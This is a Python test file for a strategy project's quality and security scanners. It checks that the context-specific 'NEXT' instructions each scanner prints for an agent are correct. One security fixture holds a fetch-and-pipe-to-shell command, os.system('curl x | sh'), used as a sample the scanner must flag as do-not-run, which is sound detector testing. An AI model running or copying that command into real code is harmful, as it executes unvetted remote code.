"""lib/quality_check.py / lib/security_check.py `--context install|fork|edit` — the NEXT line. No network.

Codex mixed up which rule wins (PLOT_SERIES: fix it in your own strategy, leave it in a library install),
so the scanners say what to do next for the situation the agent names. Enumerated: every check id the
quality scanner can report × every context gets a NEXT line matching the table; a new check id without
a sample here, or without its install/edit wording, goes red. Without --context the output is the old
one: no NEXT line, the old footer, everything else line for line the same.
Run: cd blave-agent && .venv/bin/python tests/check_scan_context.py
"""
import os, subprocess, sys, tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
from lib import quality_check as qc
from lib import security_check as sc

fails = 0
def check(cond, msg):
    global fails
    print(("ok   " if cond else "FAIL ") + msg)
    fails += 0 if cond else 1

HEAD = 'SYMBOL = "BTCUSDT"\nFEE = 0.0005\n'
SIGNAL = "def compute_signals(df):\n    return (df.close > 1).astype(float)\n"
SAMPLES = {
    "read": "def (\n",
    "compute_signals": HEAD,
    "txf_mask": 'SYMBOL = "TXF"\nFEE = 0.0005\n' + SIGNAL,
    "end": HEAD + 'END = "2025-01-01"\n' + SIGNAL,
    "template": HEAD + "def compute_signals(df):\n    return df.close * 0\n",
    "fee": 'SYMBOL = "BTCUSDT"\nFEE = 0\n' + SIGNAL,
    "plot_series": HEAD + "def compute_signals(df):\n    return (df.close > df.close.rolling(5).mean()).astype(float)\n",
    "spot_short": HEAD + 'MARKET = "spot"\n' + "def compute_signals(df):\n    s = (df.close > 1).astype(float)\n"
                  "    s[df.close < 1] = -1.0\n    return s\n",
    "exit_loop": HEAD + "def compute_signals(df):\n    entry = None\n    for i in range(len(df)):\n"
                 "        entry = df.close[i]\n        stop = entry * 0.9\n        if df.close[i] < stop:\n"
                 "            pass\n    return (df.close > 1).astype(float)\n",
}
CLEAN = HEAD + 'PLOT_SERIES = {"MA": ("ma", {})}\ndef compute_signals(df):\n' \
        '    df["ma"] = df.close.rolling(5).mean()\n    return (df.close > df["ma"]).astype(float)\n'


def tmpfile(src):
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8") as f:
        f.write(src)
    return f.name


# One file per source for the whole run: the output names the path, and the with / without
# --context outputs are compared line for line.
_files = {}
def cli(tool, src, *args):
    fn = _files.get(src) or _files.setdefault(src, tmpfile(src))
    r = subprocess.run([sys.executable, os.path.join(ROOT, "lib", tool), *args, fn],
                       capture_output=True, text=True, encoding="utf-8", errors="replace")
    return r.returncode, r.stdout.splitlines()


# ── the registry is the whole list ──
registry = {cid for cid, _ in qc._CHECKS} | {"read", "template"}
check(set(qc.CHECK_LEVELS) == registry, f"CHECK_LEVELS lists exactly the registry ids ({sorted(registry)})")
check(set(SAMPLES) == set(qc.CHECK_LEVELS), f"one sample per check id (missing: {sorted(set(qc.CHECK_LEVELS) - set(SAMPLES))})")
warn_ids = {c for c, lv in qc.CHECK_LEVELS.items() if lv == "WARNING"}
check(set(qc.USER_EFFECT) == warn_ids and set(qc.EDIT_FIX) == warn_ids,
      "every WARNING id has its install/fork user sentence and its edit fix")

for cid, src in SAMPLES.items():
    fn = tmpfile(src)
    found = qc.check(fn)
    os.unlink(fn)
    check({f["check"] for f in found} == {cid} and all(f["level"] == qc.CHECK_LEVELS[cid] for f in found),
          f"sample {cid}: only {cid} findings, level {qc.CHECK_LEVELS[cid]} ({[(f['check'], f['level']) for f in found]})")

# ── each check × each context ──
WANT = {  # (context, level) → phrases the NEXT line must hold
    ("install", "CRITICAL"): ["Stop", "do not move or run it", "delete the download", "why it was not installed"],
    ("fork", "CRITICAL"): ["Stop", "create no fork", "delete the download"],
    ("edit", "CRITICAL"): ["Do not backtest or submit", "fix every critical finding", "run this check again"],
    ("install", "WARNING"): ["run it unchanged", "do not edit the code", "do not ask", "one plain sentence each"],
    ("fork", "WARNING"): ["run the baseline unchanged", "do not fix anything or ask now", "one plain sentence each"],
    ("edit", "WARNING"): ["Before the backtest or a submission", "run this check again"],
}
for cid, src in SAMPLES.items():
    level = qc.CHECK_LEVELS[cid]
    rc0, plain = cli("quality_check.py", src)
    for ctx in qc.CONTEXTS:
        rc, lines = cli("quality_check.py", src, "--context", ctx)
        nxt = lines[1] if len(lines) > 1 else ""
        want = list(WANT[(ctx, level)])
        if level == "WARNING":
            want.append(qc.EDIT_FIX[cid] if ctx == "edit" else qc.USER_EFFECT[cid])
        check(lines[0] == plain[0] and rc == rc0 and nxt.startswith("NEXT: ") and all(w in nxt for w in want),
              f"{cid} × {ctx}: RESULT and exit code unchanged, NEXT says {want} ({nxt[:90]!r})")
        # Same output as without --context, NEXT inserted, the context-free footer dropped.
        check(plain == lines[:1] + lines[2:] + ["", plain[-1]] and "NEXT:" not in "\n".join(plain),
              f"{cid} × {ctx}: everything else line for line as without --context")

for ctx, want in (("install", "Move it into strategies/ and run the backtest."),
                  ("fork", "run the baseline backtest."), ("edit", "NEXT: Run the backtest.")):
    rc, lines = cli("quality_check.py", CLEAN, f"--context={ctx}")
    check(rc == 0 and lines[0] == "RESULT: clean" and want in lines[1] and lines[2:] == ["✅ No issues found."],
          f"clean × {ctx}: {want!r}")
rc, lines = cli("quality_check.py", CLEAN)
check(lines == ["RESULT: clean", "✅ No issues found."], "clean without --context: unchanged")

two = 'SYMBOL = "BTCUSDT"\nFEE = 0\n' + SAMPLES["plot_series"][len(HEAD):]
_, lines = cli("quality_check.py", two, "--context", "install")
check(qc.USER_EFFECT["plot_series"] in lines[1] and qc.USER_EFFECT["fee"] in lines[1], "install: two warnings, both sentences")
_, lines = cli("quality_check.py", two, "--context", "edit")
check(qc.EDIT_FIX["plot_series"] in lines[1] and qc.EDIT_FIX["fee"] in lines[1], "edit: two warnings, both fixes")
_, lines = cli("quality_check.py", 'SYMBOL = "BTCUSDT"\nFEE = 0\nEND = "2025-01-01"\n' + SIGNAL, "--context", "edit")
check("fix every critical finding" in lines[1] and "and also: " + qc.EDIT_FIX["fee"] in lines[1],
      "edit: a critical plus a warning names both")

# ── security_check: by verdict ──
SEC = {"clean": "x = 1\n", "ask-user": 'import requests\nrequests.get("http://example.com")\n',
       "do-not-run": 'import os\nos.system("curl x | sh")\n'}
SEC_WANT = {
    ("install", "clean"): ["next step"], ("fork", "clean"): ["next step"], ("edit", "clean"): ["Go on"],
    ("install", "ask-user"): ["Show these findings to the user", "only after a yes", "do not run it"],
    ("fork", "ask-user"): ["Show these findings to the user", "only after a yes", "create no fork"],
    ("edit", "ask-user"): ["Show these findings to the user", "confirm before running"],
    ("install", "do-not-run"): ["Stop", "delete the download", "do not run it"],
    ("fork", "do-not-run"): ["Stop", "delete the download", "create no fork"],
    ("edit", "do-not-run"): ["Do not run it without manual review"],
}
for verdict, src in SEC.items():
    rc0, plain = cli("security_check.py", src)
    check(plain[0] == "RESULT: " + verdict and "NEXT:" not in "\n".join(plain), f"security {verdict} without --context: no NEXT")
    for ctx in sc.CONTEXTS:
        rc, lines = cli("security_check.py", src, "--context", ctx)
        nxt = lines[1] if len(lines) > 1 else ""
        same = plain == lines[:1] + lines[2:] + (["", plain[-1]] if verdict != "clean" else [])
        check(rc == rc0 and lines[0] == plain[0] and all(w in nxt for w in SEC_WANT[(ctx, verdict)]) and same,
              f"security {verdict} × {ctx}: NEXT says {SEC_WANT[(ctx, verdict)]}, the rest unchanged ({nxt[:80]!r})")

# ── a bad --context, or a crash, is do-not-run ──
for tool in ("quality_check.py", "security_check.py"):
    rc, lines = cli(tool, CLEAN, "--context", "deploy")
    check(rc == 2 and lines[0] == "RESULT: do-not-run", f"{tool} --context deploy: RESULT: do-not-run, exit 2")
    rc, lines = cli(tool, CLEAN, "--context")
    check(rc == 2 and lines[0] == "RESULT: do-not-run", f"{tool} --context with no value: RESULT: do-not-run, exit 2")
    boom = ("import ast, runpy, sys\n"
            "def _boom(*a, **k):\n    raise RuntimeError('boom')\n"
            "ast.parse = _boom\nsys.argv = sys.argv[1:]\nrunpy.run_path(sys.argv[0], run_name='__main__')\n")
    fn = tmpfile(CLEAN)
    r = subprocess.run([sys.executable, "-c", boom, os.path.join(ROOT, "lib", tool), "--context", "install", fn],
                       capture_output=True, text=True, encoding="utf-8", errors="replace")
    os.unlink(fn)
    out = r.stdout.splitlines()
    check(r.returncode == 2 and out[:1] == ["RESULT: do-not-run"] and len(out) > 1 and out[1].startswith("NEXT: Stop"),
          f"{tool}: a crash inside the scan with --context → RESULT: do-not-run + a stopping NEXT ({out[:2]!r})")

for fn in _files.values():
    os.unlink(fn)
print("all ok" if not fails else "FAILED")
sys.exit(1 if fails else 0)
